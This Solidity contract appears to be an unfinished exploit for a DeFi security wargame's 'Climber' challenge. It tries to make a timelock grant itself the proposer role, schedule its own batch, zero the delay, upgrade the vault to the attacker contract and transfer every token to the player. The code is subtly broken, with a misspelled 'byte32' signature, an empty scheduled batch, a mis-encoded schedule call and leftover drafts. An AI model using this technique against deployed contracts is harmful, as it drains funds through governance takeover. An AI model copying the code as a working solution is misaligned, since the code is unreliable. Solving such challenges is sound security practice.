// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "./ClimberVault.sol";

interface ITimelock {
    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory dataElements,
        bytes32 salt
    ) external;

    function grantRole(bytes32 role, address account) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract testClimber is ClimberVault {
    address token;
    address timelock;
    address climber;
    address player;

    constructor(
        address _token,
        address _timelock,
        address _climber,
        address _player
    ) {
        token = _token;
        player = _player;
        timelock = _timelock;
        climber = _climber;
    }

    function start() external {
        //grant role
        address[] memory targets = new address[](2);
        targets[0] = timelock; //grant role
        targets[1] = timelock; //call shedule
        uint256[] memory values = new uint256[](2);
        bytes[] memory dataElementsInner;
        {
            // dataElementsInner = new bytes[](2);
            // dataElementsInner[0] = abi.encodeWithSignature(
            //     "grantRole(byte32,address)",
            //     PROPOSER_ROLE,
            //     address(this)
            // );
            // dataElementsInner[1] = abi.encodeWithSignature(
            //     "schedule(address[],uint256[],bytes[],bytes32)",
            //     targets,
            //     values,
            //     dataElements,
            //     bytes32("1")
            // );
        }
        bytes[] memory dataElements = new bytes[](2);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(byte32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        dataElements[1] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)",
            targets,
            values,
            dataElementsInner,
            bytes32("1")
        );

        ITimelock(timelock).execute(
            targets,
            values,
            dataElements,
            bytes32("1")
        );
    }

    function startbak() external {
        //todo update delay 0
        // function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        address[] memory targets = new address[](4);
        targets[0] = timelock; //grant role
        targets[1] = timelock; //update delay
        targets[2] = climber; //update contract
        targets[3] = timelock; //call shedule
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        dataElements[0] = abi.encodeWithSignature(
            "grantRole(byte32,address)",
            PROPOSER_ROLE,
            address(this)
        );
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );
        dataElements[2] = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(this)
        );
        dataElements[3] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)",
            address(this)
        );
        // function schedule(
        //         address[] calldata targets,
        //         uint256[] calldata values,
        //         bytes[] calldata dataElements,
        //         bytes32 salt
        //     ) external
        // ITimelock(timelock).schedule(
        //     targets,
        //     values,
        //     dataElements,
        //     bytes32("1")
        // );
        ITimelock(timelock).execute(
            targets,
            values,
            dataElements,
            bytes32("1")
        );
        //update vault to this contract
        //transfer token to player
        IERC20(token).transfer(player, IERC20(token).balanceOf(address(this)));
    }

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    fallback() external payable {}

    receive() external payable {}
}
